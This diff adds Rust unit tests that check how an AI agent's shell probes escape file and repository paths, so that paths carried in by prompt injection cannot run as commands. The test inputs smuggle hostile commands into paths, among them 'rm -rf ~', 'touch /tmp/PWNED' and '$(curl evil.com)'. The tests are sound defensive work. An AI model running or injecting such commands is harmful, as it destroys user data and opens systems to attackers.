@@ -97,3 +97,152 @@ mod binary_detection {
         assert!(block_on(is_file_content_binary_async(&missing)));
     }
 }
+
+mod path_shell_quoting {
+    //! These probes (`is_file_path`, `is_git_repository`) are called as
+    //! side-effects of other agent tool calls (`grep`, `glob`) and run on the
+    //! user's shell WITHOUT a separate per-command approval gate. A path
+    //! containing shell metacharacters — whether legitimate (a folder named
+    //! `foo (copy)`) or attacker-influenced via prompt injection (a path the
+    //! model copied out of a fetched web page or a file it `read`) — must not
+    //! be re-interpreted by the shell. These tests pin the expected
+    //! byte-for-byte shape of the emitted commands.
+    use super::super::{build_is_file_path_command, build_is_git_repository_command};
+    use crate::terminal::shell::ShellType;
+
+    #[test]
+    fn is_file_path_plain_posix() {
+        assert_eq!(
+            build_is_file_path_command("/tmp/file.txt", ShellType::Bash),
+            "test -f /tmp/file.txt",
+        );
+    }
+
+    #[test]
+    fn is_file_path_with_spaces_posix() {
+        // A path with a space must be a single shell word after escaping.
+        assert_eq!(
+            build_is_file_path_command("/tmp/has space/file", ShellType::Zsh),
+            "test -f /tmp/has\\ space/file",
+        );
+    }
+
+    #[test]
+    fn is_file_path_command_substitution_posix() {
+        // Without escaping the shell would run `touch /tmp/PWNED` before
+        // `test -f`. After escaping, `$(...)` and `(`/`)` are literal.
+        let cmd = build_is_file_path_command("/tmp/x$(touch /tmp/PWNED)y", ShellType::Bash);
+        assert!(
+            !cmd.contains("$(touch"),
+            "command substitution must be neutralized; got: {cmd}",
+        );
+        assert_eq!(cmd, "test -f /tmp/x\\$\\(touch\\ /tmp/PWNED\\)y");
+    }
+
+    #[test]
+    fn is_file_path_backtick_substitution_posix() {
+        let cmd = build_is_file_path_command("/tmp/`id`", ShellType::Bash);
+        assert!(
+            !cmd.contains("`id`"),
+            "backtick substitution must be neutralized; got: {cmd}",
+        );
+    }
+
+    #[test]
+    fn is_file_path_variable_expansion_posix() {
+        // `$HOME` inside the path must not expand to the user's home dir; the
+        // `$` is backslash-escaped so the shell treats it as a literal.
+        assert_eq!(
+            build_is_file_path_command("/tmp/$HOME/x", ShellType::Bash),
+            "test -f /tmp/\\$HOME/x",
+        );
+    }
+
+    #[test]
+    fn is_file_path_semicolon_chain_posix() {
+        // A trailing `;rm -rf ~` must not turn into a second command; the `;`,
+        // spaces, and `~` are all backslash-escaped.
+        assert_eq!(
+            build_is_file_path_command("/tmp/x;rm -rf ~", ShellType::Bash),
+            "test -f /tmp/x\\;rm\\ -rf\\ \\~",
+        );
+    }
+
+    #[test]
+    fn is_file_path_plain_powershell() {
+        assert_eq!(
+            build_is_file_path_command("C:\\Users\\me\\file.txt", ShellType::PowerShell),
+            "if (Test-Path -PathType Leaf C:\\Users\\me\\file.txt) { exit 0 } else { exit 1 }",
+        );
+    }
+
+    #[test]
+    fn is_file_path_command_substitution_powershell() {
+        // PowerShell expands `$(...)` inside `"..."`; with backtick-escaping
+        // applied, the substitution becomes literal text.
+        let cmd =
+            build_is_file_path_command("C:\\tmp\\x$(rm -rf ~)y", ShellType::PowerShell);
+        assert!(
+            !cmd.contains("$(rm"),
+            "PowerShell `$(...)` must be neutralized; got: {cmd}",
+        );
+    }
+
+    #[test]
+    fn is_file_path_variable_expansion_powershell() {
+        // PowerShell would normally interpolate `$env:HOME`-style references
+        // inside `"..."`. Backtick-escaping the `$` makes it literal.
+        assert_eq!(
+            build_is_file_path_command(
+                "C:\\tmp\\$env:USERPROFILE\\x",
+                ShellType::PowerShell,
+            ),
+            "if (Test-Path -PathType Leaf C:\\tmp\\`$env:USERPROFILE\\x) { exit 0 } else { exit 1 }",
+        );
+    }
+
+    #[test]
+    fn is_git_repository_plain_posix() {
+        assert_eq!(
+            build_is_git_repository_command("/tmp/repo", ShellType::Bash),
+            "git -C /tmp/repo rev-parse",
+        );
+    }
+
+    #[test]
+    fn is_git_repository_command_substitution_posix() {
+        let cmd = build_is_git_repository_command("/tmp/x$(curl evil.com)", ShellType::Bash);
+        assert!(
+            !cmd.contains("$(curl"),
+            "command substitution must be neutralized; got: {cmd}",
+        );
+        assert_eq!(cmd, "git -C /tmp/x\\$\\(curl\\ evil.com\\) rev-parse");
+    }
+
+    #[test]
+    fn is_git_repository_plain_powershell() {
+        assert_eq!(
+            build_is_git_repository_command("C:\\repo", ShellType::PowerShell),
+            "git -C C:\\repo rev-parse",
+        );
+    }
+
+    #[test]
+    fn is_git_repository_command_substitution_powershell() {
+        let cmd =
+            build_is_git_repository_command("C:\\x$(rm -rf ~)y", ShellType::PowerShell);
+        assert!(
+            !cmd.contains("$(rm"),
+            "PowerShell `$(...)` must be neutralized; got: {cmd}",
+        );
+    }
+
+    #[test]
+    fn is_file_path_fish_uses_posix_escape() {
+        // Fish is grouped with the POSIX shell family for escaping purposes
+        // (see `From<ShellType> for ShellFamily`).
+        let cmd = build_is_file_path_command("/tmp/x$(id)y", ShellType::Fish);
+        assert!(!cmd.contains("$(id)"));
+        assert!(cmd.starts_with("test -f "));
+    }
+}
